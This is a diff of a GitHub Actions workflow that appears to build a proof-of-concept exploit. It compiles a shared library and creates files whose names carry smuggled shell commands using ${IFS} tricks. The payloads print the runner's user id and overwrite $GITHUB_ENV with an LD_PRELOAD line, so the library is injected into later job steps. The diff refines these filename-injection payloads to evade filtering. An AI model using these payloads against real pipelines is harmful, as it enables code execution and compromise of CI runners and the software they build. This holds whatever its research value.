@@ -17,6 +17,7 @@ jobs:
           cd content
           printf 'BENIGN\n' > summary.txt
           printf 'BENIGN\n' > x.txt
+          printf 'LD_PRELOAD=/tmp/content/content/libpoc.so\n' > env.txt
           cat > libpoc.c <<'EOF'
           #define _GNU_SOURCE
           #include <stdio.h>
@@ -44,8 +45,8 @@ jobs:
           }
           EOF
           gcc -shared -fPIC -O2 -o libpoc.so libpoc.c
-          touch 'x$(echo${IFS}RCE_PROOF_$(id${IFS}-u)_${GITHUB_RUN_ID}>&2).txt'
-          touch 'x$(echo${IFS}LD_PRELOAD=${PWD:0:1}tmp${PWD:0:1}content${PWD:0:1}content${PWD:0:1}libpoc.so>>$GITHUB_ENV).txt'
+          touch 'x$(echo${IFS}RCE_PROOF_$(id${IFS}-u)_${GITHUB_RUN_ID}).txt'
+          touch 'x$(s=$(printf${IFS}%.1s${IFS}$GITHUB_ENV);cp${IFS}$s${s}tmp${s}content${s}content${s}env.txt${IFS}$GITHUB_ENV).txt'
           ls -la
       - name: Upload artifact
         uses: actions/upload-artifact@v4
